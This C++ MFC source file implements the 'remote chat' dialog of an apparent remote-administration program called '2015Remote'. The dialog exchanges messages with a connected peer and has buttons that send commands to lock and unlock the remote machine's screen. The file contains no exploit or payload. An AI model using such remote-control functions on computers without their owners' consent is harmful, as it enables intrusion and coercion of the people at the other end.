// Chat.cpp : implementation file
//

#include "stdafx.h"
#include "2015Remote.h"
#include "Chat.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif

/////////////////////////////////////////////////////////////////////////////
// CChat dialog


CChat::CChat(CWnd* pParent, ISocketBase* pIOCPServer, ClientContext* pContext)
    : DialogBase(CChat::IDD, pParent, pIOCPServer, pContext, IDI_CHAT)
{
}


void CChat::DoDataExchange(CDataExchange* pDX)
{
    CDialog::DoDataExchange(pDX);
    DDX_Control(pDX, IDC_EDIT_TIP, m_editTip);
    DDX_Control(pDX, IDC_EDIT_NEWMSG, m_editNewMsg);
    DDX_Control(pDX, IDC_EDIT_CHATLOG, m_editChatLog);
}


BEGIN_MESSAGE_MAP(CChat, CDialog)
    ON_BN_CLICKED(IDC_BUTTON_SEND, OnButtonSend)
    ON_BN_CLICKED(IDC_BUTTON_END, OnButtonEnd)
    ON_WM_CTLCOLOR()
    ON_WM_CLOSE()
    ON_EN_SETFOCUS(IDC_EDIT_CHATLOG, OnSetfocusEditChatLog)
    ON_EN_KILLFOCUS(IDC_EDIT_CHATLOG, OnKillfocusEditChatLog)
    ON_BN_CLICKED(IDC_LOCK, &CChat::OnBnClickedButton_LOCK)
    ON_BN_CLICKED(IDC_UNLOCK, &CChat::OnBnClickedButton_UNLOCK)
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CCHAT message handlers

BOOL CChat::OnInitDialog()
{
    CDialog::OnInitDialog();

    CString str;
    str.Format(_T("远程交谈 - %s"), m_ContextObject->PeerName.c_str()),
               SetWindowText(str);
    m_editTip.SetWindowText(_T("提示: 对方聊天对话框在发送消息后才会弹出"));
    m_editNewMsg.SetLimitText(4079);
    // TODO: Add extra initialization here
    BYTE bToken = COMMAND_NEXT_CHAT;
    m_iocpServer->Send(m_ContextObject, &bToken, sizeof(BYTE));
    SetIcon(m_hIcon, TRUE);			// Set big icon
    SetIcon(m_hIcon, FALSE);		// Set small icon

    return TRUE;  // return TRUE unless you set the focus to a control
    // EXCEPTION: OCX Property Pages should return FALSE
}

void CChat::OnReceive()
{
}

void CChat::OnReceiveComplete()
{
    m_ContextObject->m_DeCompressionBuffer.Write((LPBYTE)_T(""), 1);
    char* strResult = (char*)m_ContextObject->m_DeCompressionBuffer.GetBuffer(0);
    SYSTEMTIME st;
    GetLocalTime(&st);
    char Text[5120] = { 0 };
    sprintf_s(Text, _T("%s %d/%d/%d %d:%02d:%02d\r\n  %s\r\n\r\n"), _T("对方:"),
               st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond, strResult);
    if (m_editChatLog.GetWindowTextLength() >= 20000)
        m_editChatLog.SetWindowText(_T(""));
    m_editChatLog.SetSel(-1);
    m_editChatLog.ReplaceSel(Text);
}

void CChat::OnButtonSend()
{
    char str[4096];
    GetDlgItemText(IDC_EDIT_NEWMSG, str, sizeof(str));
    if (_tcscmp(str, _T("")) == 0) {
        m_editNewMsg.SetFocus();
        return; // 发送消息为空不处理
    }
    m_editTip.ShowWindow(SW_HIDE);
    m_iocpServer->Send(m_ContextObject, (LPBYTE)str, lstrlen(str) + sizeof(char));
    SYSTEMTIME st;
    GetLocalTime(&st);
    char Text[5120] = { 0 };
    sprintf_s(Text, _T("%s %d/%d/%d %d:%02d:%02d\r\n  %s\r\n\r\n"), _T("自己:"),
               st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond, str);
    if (m_editChatLog.GetWindowTextLength() >= 20000)
        m_editChatLog.SetWindowText(_T(""));
    m_editChatLog.SetSel(-1);
    m_editChatLog.ReplaceSel(Text);
    m_editNewMsg.SetWindowText(_T(""));
    m_editNewMsg.SetFocus();
}

void CChat::OnButtonEnd()
{
    SendMessage(WM_CLOSE, 0, 0);
}

void CChat::OnClose()
{
    CancelIO();

	CDialogBase::OnClose();
}

HBRUSH CChat::OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor)
{
    if (pWnd->GetDlgCtrlID() == IDC_EDIT_CHATLOG && nCtlColor == CTLCOLOR_STATIC) {
        COLORREF clr = RGB(0, 0, 0);
        pDC->SetTextColor(clr);   // 设置黑色的文本
        clr = RGB(255, 255, 255);
        pDC->SetBkColor(clr);     // 设置白色的背景
        return CreateSolidBrush(clr);  // 作为约定，返回背景色对应的刷子句柄
    } else if (pWnd == &m_editTip && nCtlColor == CTLCOLOR_EDIT) {
        COLORREF clr = RGB(255, 0, 0);
        pDC->SetTextColor(clr);   // 设置红色的文本
        clr = RGB(220, 220, 0);
        pDC->SetBkColor(clr);     // 设置黄色的背景
        return CreateSolidBrush(clr);  // 作为约定，返回背景色对应的刷子句柄
    } else {
        return CDialog::OnCtlColor(pDC, pWnd, nCtlColor);
    }
}

void CChat::PostNcDestroy()
{
    if (!m_bIsClosed)
        OnCancel();
    CDialog::PostNcDestroy();
    delete this;
}

BOOL CChat::PreTranslateMessage(MSG* pMsg)
{
    if (pMsg->message == WM_KEYDOWN && pMsg->wParam == VK_ESCAPE) {
        return true;
    }
    return CDialog::PreTranslateMessage(pMsg);
}

void CChat::OnSetfocusEditChatLog()
{
    if (m_editTip.IsWindowVisible())
        m_editTip.RedrawWindow(NULL, NULL, RDW_INVALIDATE | RDW_FRAME);
}

void CChat::OnKillfocusEditChatLog()
{
    if (m_editTip.IsWindowVisible())
        m_editTip.RedrawWindow(NULL, NULL, RDW_INVALIDATE | RDW_FRAME);
}

void CChat::OnBnClickedButton_LOCK()
{

    BYTE bToken = COMMAND_CHAT_SCREEN_LOCK;
    m_iocpServer->Send(m_ContextObject, &bToken, sizeof(BYTE));
}

void CChat::OnBnClickedButton_UNLOCK()
{
    BYTE bToken = COMMAND_CHAT_SCREEN_UNLOCK;
    m_iocpServer->Send(m_ContextObject, &bToken, sizeof(BYTE));
}
